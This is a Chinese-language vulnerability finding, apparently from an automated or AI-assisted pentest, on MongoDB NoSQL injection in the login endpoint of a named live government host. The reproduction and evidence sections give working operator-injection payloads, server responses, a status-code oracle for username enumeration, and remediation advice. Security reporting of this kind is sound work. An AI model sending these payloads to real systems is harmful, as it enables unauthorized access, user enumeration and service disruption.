# /login 接口存在 MongoDB NoSQL 注入（用户名/密码字段未过滤，状态码 oracle 泄露 source 校验）

- ID: `0d7a556c-b090-45ab-b876-e2f6849d829e`
- Severity: **high**
- Status: open
- Type: NoSQL 注入
- Target: `https://epcr.tpf.gov.tw:4004/login (POST, username & password 字段)`
- Conversation: `532cedc0-0580-4045-a5e2-45c07c488867`
- Created: 2026-09-06 16:42:41.305706016+08:00

## Description

/login 接口的 username/password 字段直接拼入 MongoDB find() 查询，未做类型/操作符过滤。攻击者注入 $ne/$or/$gt/$lt 等操作符可改变查询语义。响应状态码存在 oracle 差异：注入多文档匹配操作符（$ne/$or/$and/$gt/$lt）时返回 403{"message":"無法登入的來源"}（source 白名单校验失败），注入单文档/零文档匹配（$eq/$regex/$in/精确字符串）时返回 500 TypeError（服务端 result[0] 处理崩溃）。403 消息泄露了服务端存在 source 来源白名单校验逻辑。

## Reproduction

1. 浏览器/requests 访问 https://epcr.tpf.gov.tw:4004/ 并 GET /captcha 获取 connect.sid session（验证码正确与否不影响以下注入现象）
2. POST /login，Content-Type: application/json，body: {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"} -> 返回 403 source 错误
3. POST /login，body: {"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"} -> 返回 500 "TypeError"
4. 对比：将 username 改为 {"$or":[{"$ne":null}]} 或 {"$gt":""} -> 403；改为 {"$regex":"."} 或 {"$in":["a","b"]} -> 500
5. 结论：状态码随注入操作符的匹配文档数变化，证实 NoSQL 注入

## Evidence

1) 多文档->403: POST /login {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"} -> 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}（需先 GET /captcha 建 session）
2) 单/零文档->500: POST /login {"username":"admin","password":"x","captcha":"1"} -> 500 "TypeError"；{"username":{"$eq":"ZzzZ"},...} -> 500 "TypeError"
3) 操作符边界: $ne/$or/$and/$gt/$lt -> 403(SOURCE路径); $eq/$regex/$in/$nin/$exists/$elemMatch/$not/精确字符串 -> 500(崩溃)
4) password 条件不影响状态码（username 决定路径）; domain/source 请求字段不影响 403（校验基于用户文档 source 字段）

## Impact

1) 信息泄露：通过状态码差异可推断用户名存在性（多文档/单文档匹配）及服务端 source 校验逻辑；500 泄露服务端异常（TypeError 栈）。2) 潜在认证绕过：若 source 白名单校验与密码校验顺序不当，注入特定操作符可能跳过密码验证。3) 500 崩溃表明查询结果处理缺乏防御，可能引发 DoS（可重复触发 500）。4) 进一步可利用：结合 $where/正则可实现用户名枚举与数据泄露。

## Recommendation

1) 对 username/password 输入做严格类型校验（强制 string），拒绝含 $ 操作符的对象；2) 使用 mquery/白名单解析 MongoDB 查询，剥离 $ 前缀操作符；3) 统一错误响应：无论匹配 0/1/多文档均返回相同格式（如 401 无效凭据），避免状态码 oracle；4) source 白名单校验使用固定集合且与密码校验解耦；5) 全局异常处理避免 TypeError 直接暴露。
